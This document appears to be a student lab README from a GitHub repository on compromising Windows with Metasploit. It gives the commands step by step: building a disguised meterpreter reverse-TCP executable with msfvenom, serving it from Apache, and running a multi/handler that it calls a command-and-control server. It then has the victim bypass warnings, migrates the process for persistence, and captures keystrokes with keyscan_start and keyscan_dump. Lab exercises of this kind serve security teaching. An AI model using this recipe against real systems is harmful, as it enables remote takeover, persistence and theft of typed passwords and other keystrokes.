# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:

![image](https://github.com/LakshmanAdhireddy/Compromising-windows-using-Metasploit/assets/118707265/88064344-1940-4f15-8a52-ca2380e2ae21)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT
![image](https://github.com/LakshmanAdhireddy/Compromising-windows-using-Metasploit/assets/118707265/8fbcb94f-8334-442d-a6ac-031c04ffaf65)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/LakshmanAdhireddy/Compromising-windows-using-Metasploit/assets/118707265/d25cf573-c2a6-4985-b332-d19a1aee9453)

Start apache server sudo systemctl apache2 start
![image](https://github.com/LakshmanAdhireddy/Compromising-windows-using-Metasploit/assets/118707265/d84eefbb-435a-4b31-8ef3-7889975e962e)

Check the status of apache2
![image](https://github.com/LakshmanAdhireddy/Compromising-windows-using-Metasploit/assets/118707265/f3e41a9e-1449-4b65-9f6e-59ccaf5b39c9)

Invoke msfconsole:

### OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![image](https://github.com/LakshmanAdhireddy/Compromising-windows-using-Metasploit/assets/118707265/365bd943-d66c-4c6f-bded-05b920cd0151)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/LakshmanAdhireddy/Compromising-windows-using-Metasploit/assets/118707265/fd85c222-108b-43fe-8bb2-7a40f00b3133)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/LakshmanAdhireddy/Compromising-windows-using-Metasploit/assets/118707265/fbd38c2f-ed48-41b2-9ecf-0be37bffee17)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/LakshmanAdhireddy/Compromising-windows-using-Metasploit/assets/118707265/5d26d0ba-a112-402e-985b-7d1ed47199a4)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/LakshmanAdhireddy/Compromising-windows-using-Metasploit/assets/118707265/af832951-cc73-4944-8f1d-8b0494b41d5f)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/LakshmanAdhireddy/Compromising-windows-using-Metasploit/assets/118707265/0b655167-cb4c-47f9-bba0-28db6985e7fb)


## RESULT:

The Metasploit framework is  used to compromise windows and is examined successfully.
